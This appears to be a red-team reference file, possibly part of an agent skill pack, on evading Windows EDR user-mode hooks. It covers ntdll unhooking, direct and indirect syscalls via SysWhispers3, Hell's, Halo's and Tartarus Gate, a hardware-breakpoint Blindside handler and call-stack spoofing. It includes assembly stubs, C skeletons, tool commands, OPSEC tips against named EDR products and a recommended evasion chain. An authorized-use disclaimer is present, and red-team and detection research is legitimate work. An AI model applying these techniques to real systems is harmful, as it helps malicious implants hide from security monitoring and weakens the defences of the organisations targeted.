# Unhook / direct / indirect syscall techniques

> Use only for authorized red teams, adversary simulations, and owned-product testing. Do not use against unauthorized targets.

This document summarizes current techniques for bypassing user-mode hooks, from classic unhooking to hardware breakpoint Blindside.
Map every technique to MITRE ATT&CK T1562.001 / T1027 / T1055 for reporting.

## 1. Peruns Fart / fresh ntdll from disk

### Principle

All EDR hooks are in **the ntdll.dll mapped in the current process memory**. The `C:\Windows\System32\ntdll.dll` on disk is clean.
Map the disk ntdll into the current process and overwrite the in-memory `.text` section to remove the hooks.

```text
Current process ntdll.dll (RWX)
  ┌─────────────────────────┐
  │ .text (contains EDR hook jmp) │ ◄── overwrite with clean disk .text
  └─────────────────────────┘
        ▲
        │ NtMapViewOfSection(disk_ntdll)
        │
  Disk C:\Windows\System32\ntdll.dll  ← clean
```

### Implementation points

```c
// Steps:
// 1. CreateFileW("\\Device\\HarddiskVolumeX\\Windows\\System32\\ntdll.dll")  // Use the native path to bypass monitoring.
// 2. NtCreateSection (SEC_IMAGE)
// 3. NtMapViewOfSection to a new address
// 4. Find the .text section at the new address
// 5. NtProtectVirtualMemory: change the current ntdll .text to RW
// 6. memcpy to overwrite it
// 7. NtProtectVirtualMemory: restore RX
```

### Notes

- `NtProtectVirtualMemory` itself may be hooked. This creates a chain problem. Use a **direct syscall** to call `NtProtectVirtualMemory` first.
- Modern EDR monitors W operations by `NtProtectVirtualMemory` on ntdll memory. Combine this with an ETW patch.
- Peruns Fart leaves `KERNEL_MODULE_LOAD` and `PROTECTVM` events under ETW-TI. Suppress ETW first.

## 2. Direct syscall

### Principle

Do not call ntdll exports. Write the syscall stub yourself:

```asm
NtAllocateVirtualMemory:
    mov r10, rcx
    mov eax, 0x18      ; SSN (value on Win11 24H2; differs by version)
    syscall
    ret
```

The `syscall` instruction jumps directly from user mode to the kernel SSDT and bypasses all user-mode hooks.

### SysWhispers3 usage

```powershell
git clone https://github.com/klezVirus/SysWhispers3
cd SysWhispers3
python3 syswhispers.py --preset all --action edit -o syscalls
```

Output:

```text
syscalls.h    - Function declarations
syscalls.c    - C glue code
syscalls.asm  - MASM assembly stubs
syscallsstubs.std.x64.asm  - Standard direct syscall
```

In Visual Studio:

```text
1. Add .asm to the project and enable MASM (Custom Build Tool).
2. include syscalls.h
3. Call Sw3NtAllocateVirtualMemory(...) instead of NtAllocateVirtualMemory.
```

### Minimal direct syscall to `NtCreateFile` (C skeleton)

```c
// syscalls.asm (excerpt)
// Sw3NtCreateFile PROC
//     mov [rsp +8], rcx
//     mov [rsp+16], rdx
//     mov [rsp+24], r8
//     mov [rsp+32], r9
//     sub rsp, 28h
//     mov ecx, 0x55           ; function hash (dynamically resolve SSN)
//     call Sw3GetSyscallNumber
//     add rsp, 28h
//     mov rcx, [rsp+8]
//     mov rdx, [rsp+16]
//     mov r8,  [rsp+24]
//     mov r9,  [rsp+32]
//     mov r10, rcx
//     syscall
//     ret
// Sw3NtCreateFile ENDP

#include <windows.h>
#include "syscalls.h"

int main(void) {
    HANDLE hFile = NULL;
    OBJECT_ATTRIBUTES oa;
    UNICODE_STRING uName;
    IO_STATUS_BLOCK iosb;
    WCHAR path[] = L"\\??\\C:\\Windows\\Temp\\edr_test.bin";

    uName.Buffer = path;
    uName.Length = (USHORT)(wcslen(path) * sizeof(WCHAR));
    uName.MaximumLength = uName.Length + sizeof(WCHAR);

    InitializeObjectAttributes(&oa, &uName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NTSTATUS st = Sw3NtCreateFile(
        &hFile,
        FILE_GENERIC_WRITE,
        &oa,
        &iosb,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OVERWRITE_IF,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );

    if (st >= 0) {
        // Write a few bytes here.
        Sw3NtClose(hFile);
        return 0;
    }
    return (int)st;
}
```

### Limitations

- The syscall instruction is in the implant's own `.text` section, not ntdll. Kernel telemetry can identify a syscall from a non-ntdll address.
- This is why indirect syscall was developed.

## 3. Indirect syscall

### Principle

The syscall instruction still comes from ntdll.dll at a legitimate address. We control the SSN and return address:

```text
implant code:
    mov r10, rcx
    mov eax, <SSN>
    jmp [<address of a syscall;ret gadget in ntdll>]   ; syscall is not in the implant
```

The gadget is usually the two-byte `syscall; ret` sequence at the end of an `Nt*` function.
Kernel ETW sees an ntdll RIP and therefore sees a legitimate behavior pattern.

### SysWhispers3 indirect mode

```powershell
python3 syswhispers.py --preset all --action edit --mode jumper -o syscalls
# --mode jumper            => indirect syscall
# --mode jumper_randomized => randomize the jmp target to reduce signatures
```

Generated stub:

```asm
Sw3NtAllocateVirtualMemory PROC
    mov [rsp+8], rcx
    ...
    mov ecx, 0x18                  ; function hash
    call Sw3GetSyscallNumber       ; return SSN → eax
    call Sw3GetSyscallAddress      ; return syscall;ret address in ntdll → rbx
    ...
    mov r10, rcx
    jmp rbx                        ; jump to a legitimate syscall instruction in ntdll
Sw3NtAllocateVirtualMemory ENDP
```

## 4. Hell's Gate / Halo's Gate / Tartarus Gate

These three techniques evolved to solve dynamic SSN resolution.

### Hell's Gate

- Assumes ntdll is not hooked.
- At implant startup, traverse ntdll `Nt*` exports. Extract the SSN from the first four bytes, `mov eax, <SSN>`.
- Advantage: Does not hard-code the SSN. Works across Windows versions.
- Limitation: Extraction fails when ntdll is already hooked and the first byte is jmp.

### Halo's Gate

- Fixes the hook problem in Hell's Gate.
- When a function is hooked and does not have a standard prologue, scan ±N neighboring functions.
- Use the fact that SSNs for ntdll `Nt*` functions increase consecutively. Infer the hooked function's SSN from a neighbor.

```text
Normal:
  NtAllocateVirtualMemory  SSN = 0x18
  NtQueryInformationProcess SSN = 0x19
  NtProtectVirtualMemory    SSN = 0x50

If NtAllocateVirtualMemory is hooked and its SSN is not visible, inspect neighbors:
  Previous unhooked export SSN = 0x17
  Next unhooked export SSN = 0x19
  → NtAllocateVirtualMemory SSN = 0x18
```

### Tartarus Gate

- Handles advanced hooks that change the SSN but retain the syscall instruction.
- Validates both the SSN and the syscall;ret gadget address.
- The three techniques together provide a stable basis for indirect syscall.

### Reference implementations (after the bootstrap git clone)

```text
Hell's Gate:    am0nsec/HellsGate
Halo's Gate:    am0nsec/HellsGate (includes fallback logic) / SafeBreach-Labs/HalosGate-PoC
Tartarus Gate:  trickster0/TartarusGate
SysWhispers3:   integrates all three
```

## 5. Hardware breakpoint Blindside

### Principle

Use debug registers `DR0-DR3` to set a hardware breakpoint at the EDR hook trampoline entry.
Set a VEH (Vectored Exception Handler) that changes RIP **directly to the address after the hook trampoline** when the breakpoint fires.
This skips EDR detection code and lands in the real syscall section in ntdll.

### Advantages

- Does not write ntdll memory, so no `NtProtectVirtualMemory` alert.
- Does not unhook. The hook remains and is bypassed.
- ETW-TI cannot see a memory modification.

### Implementation skeleton

```c
// 1. AddVectoredExceptionHandler
// 2. Set DR0..DR3 at each hooked function entry (maximum four; rotate with single-step)
// 3. SetThreadContext(thread, &ctx) to write DRx
// 4. When the EDR hook trampoline triggers a hardware breakpoint → VEH takes control
// 5. VEH changes EXCEPTION_POINTERS->ContextRecord->Rip to the legitimate syscall;ret in ntdll
// 6. ContinueExecution

LONG CALLBACK Blindside(EXCEPTION_POINTERS* ep) {
    if (ep->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        DWORD64 rip = ep->ContextRecord->Rip;
        if (rip == g_hookedNtAllocVM) {
            // SSN is already in eax. R10 = RCX. Jump to syscall;ret in ntdll.
            ep->ContextRecord->Rip = (DWORD64)g_syscallGadget;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}
```

### Limitations

- DRx is per thread. Set it separately for each thread.
- Some EDR hooks `NtSetContextThread` / `NtGetContextThread`. Bypass those with earlier techniques first.
- Win11 22H2+ introduced HVCI and anti-debug mitigations that may interfere.

## 6. Call stack spoofing

### Problem

Modern EDR calls `RtlCaptureStackBackTrace` at the kernel entry of syscalls such as `NtAllocateVirtualMemory` and `NtCreateThreadEx`.
It reports the complete call stack. The implant stack contains **non-image-backed memory** frames and triggers a high-confidence alert.

### Method A: CallStackSpoofer (William Burgess)

Implementation:

1. Before the syscall, swap the current thread stack with a forged legitimate stack.
2. Fill the forged stack frames with a fully legitimate return chain such as `kernel32!BaseThreadInitThunk → ntdll!RtlUserThreadStart`.
3. Swap back to the real stack after the syscall returns.

### Method B: SilentMoonwalk

More aggressive. Use a desynchronized stack:

```text
Execution flow:
  implant code  →  custom trampoline (change RSP / RBP / stack content)
                ↓
                syscall (RtlCaptureStackBackTrace sees the forged stack)
                ↓
                trampoline restores state → continue implant code
```

The key is unwinding. Make `RtlVirtualUnwind` enter a forged `RUNTIME_FUNCTION` / `UNWIND_INFO` chain.

### Engagement OPSEC guidance

- Call stack spoof + indirect syscall + ETW patch is a stable current combination against CrowdStrike / SentinelOne.
- Spoof during Sleep as well. Spoofing only during execution is not enough because EDR samples periodically.

## 7. Technique comparison

| Technique | Bypasses | Complexity | Current effectiveness | ATT&CK |
|-----------|----------|------------|-----------------------|--------|
| Peruns Fart | User-mode hook | Low | Medium (easy for ETW to catch) | T1562.001 |
| Direct syscall (SysWhispers) | User-mode hook | Low | Low-medium (kernel sees RIP in implant) | T1106 / T1562.001 |
| Indirect syscall (jumper) | User-mode hook + kernel RIP detection | Medium | Medium-high | T1106 |
| Hell's / Halo's / Tartarus | SSN resolution | Medium | High (infrastructure) | T1027 |
| HWBP Blindside | Hook without writes | High | High | T1562.001 |
| CallStackSpoofer / SilentMoonwalk | Call-stack telemetry | High | High | T1564 |

Recommended engagement chain: **Halo's Gate + indirect syscall + CallStackSpoofer + ETW patch**.

## References

- SysWhispers3: <https://github.com/klezVirus/SysWhispers3>
- Hell's Gate / Halo's Gate POC: <https://github.com/am0nsec/HellsGate>, <https://github.com/SafeBreach-Labs/HalosGate-PoC>
- Tartarus Gate: <https://github.com/trickster0/TartarusGate>
- CallStackSpoofer: <https://github.com/WithSecureLabs/CallStackSpoofer>
- SilentMoonwalk: <https://github.com/klezVirus/SilentMoonwalk>
- Blindside (hardware breakpoint): <https://www.cyberark.com/resources/threat-research-blog/blindside-a-new-technique-for-edr-evasion-with-hardware-breakpoints>
- MITRE T1562.001: <https://attack.mitre.org/techniques/T1562/001/>

## Routing callback

Unhook is only half of evasion. The other half is telemetry blinding. Continue to `references/telemetry-blinding.md`.
